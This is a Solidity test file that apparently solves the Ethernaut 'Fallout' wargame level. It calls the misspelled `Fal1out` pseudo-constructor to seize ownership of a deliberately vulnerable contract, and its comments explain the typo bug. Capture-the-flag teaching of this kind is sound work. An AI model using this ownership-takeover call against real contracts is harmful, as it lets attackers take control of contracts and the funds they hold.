// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Fallout.sol";
import "src/levels/FalloutFactory.sol";

contract TestFallout is BaseTest {
    Fallout private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new FalloutFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Fallout(levelAddress);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        // Before Solidity 0.4.22 the only way to define a constructor for a contract was to define a function with the same name of the contract itself
        // After that version they introduced a new `constructor` keyword to avoid this kind of mistake
        // In this case the developer made the mistake to misstype the name of the constructor
        // Contract name -> Fallout
        // Constructor name -> Fal1out
        // The result of this is that the contract was never initialized, the owner was the address(0)
        // and we were able to call the `Fal1out` function that at this point is not a constructor (callable only once)
        // but a "normal" function. This also mean that anyone can call multiple time this function switching the owner of the contract.
        level.Fal1out();

        vm.stopPrank();
    }
}
